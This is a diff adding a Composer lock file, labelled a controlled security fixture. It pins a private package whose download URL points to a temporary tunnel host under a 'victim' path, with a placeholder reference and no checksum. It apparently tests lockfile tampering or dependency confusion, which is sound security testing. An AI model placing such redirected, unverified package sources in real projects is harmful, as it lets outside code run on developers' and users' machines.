@@ -1,0 +1,32 @@
+{
+  "_readme": [
+    "This file locks the dependencies of your project to a known state",
+    "This is a controlled security fixture"
+  ],
+  "content-hash": "6e4c67da0810f8a7ba431418080a32b2",
+  "packages": [
+    {
+      "name": "h1/private-package",
+      "version": "1.0.0",
+      "dist": {
+        "type": "zip",
+        "url": "https://93e87972790e8d.lhr.life/victim/dist/h1-private-package-1.0.0.zip",
+        "reference": "1111111111111111111111111111111111111111",
+        "shasum": null
+      },
+      "require": {
+        "php": ">=7.4"
+      },
+      "type": "library"
+    }
+  ],
+  "packages-dev": [],
+  "aliases": [],
+  "minimum-stability": "stable",
+  "stability-flags": [],
+  "prefer-stable": false,
+  "prefer-lowest": false,
+  "platform": [],
+  "platform-dev": [],
+  "plugin-api-version": "2.6.0"
+}
